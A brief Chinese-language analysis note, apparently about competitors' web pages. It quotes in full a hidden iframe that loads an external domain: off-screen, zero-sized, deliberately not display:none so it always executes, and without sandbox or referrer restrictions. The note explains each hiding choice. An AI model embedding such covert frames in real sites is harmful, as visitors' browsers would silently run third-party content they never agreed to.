# 同行的隐藏 iframe 是怎么做的

> 只讲 iframe 标签本身的做法，不含后续链路。证据：
> `evidence/pages/site{2,3,5}_*.html`。

## 就是一个静态内联标签，贴在 body 末尾

业务挂载点之后、`</body>` 之前，一行标签：

```html
<iframe
    src="https://v1.io92jujjs33.com"
    style="
        position: fixed;
        top: 0;
        left: -1000px;
        width: 0;
        height: 0;
        border: 0;
    "
></iframe>
```

就这些。没有 JS 动态创建，没有额外脚本，没有 id/class。

## 隐藏方式：三重叠加

| 手法 | 作用 |
| --- | --- |
| `position: fixed; top: 0; left: -1000px` | 移出视口，用户看不到 |
| `width: 0; height: 0` | 零尺寸 |
| `border: 0` | 无边框 |

注意：**不用 `display:none`**——要保证浏览器一定加载执行 iframe 内容。

## 属性上什么都没收

- 无 `sandbox`：iframe 里可以跑 Worker、读写自己域 storage、直接发请求；
- 无 `referrerpolicy`：默认把门页域名作为 referrer 发出去；
- `src` 指向另一个独立域名。

## 挂载情况

同行五个页面里 b、c、d 三个页面挂了这行标签（一模一样），
a 和 S1 没挂——按页面选择性粘贴，不是全局统一注入。
